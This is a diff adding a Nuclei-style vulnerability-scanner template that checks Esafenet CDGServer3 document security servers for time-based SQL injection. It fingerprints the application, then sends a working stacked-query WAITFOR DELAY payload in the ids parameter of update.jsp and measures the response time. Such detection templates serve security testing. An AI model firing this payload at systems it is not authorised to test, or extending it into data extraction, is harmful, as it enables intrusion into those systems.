@@ -1,0 +1,36 @@
+id: poc-yaml-yisaitong-esafenet-update-jsp-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 Update.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1, 5)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-application
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "CDGServer3"
+
+  - id: sqli-detection
+    method: GET
+    path:
+      - "{{BaseURL}}/CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1%2C3%29%3BWAITFOR+DELAY+%270%3A0%3A{{t1}}%27--"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= (to_number(t1) * 4)"
+          - "duration < ((to_number(t1) * 4) + 1)"
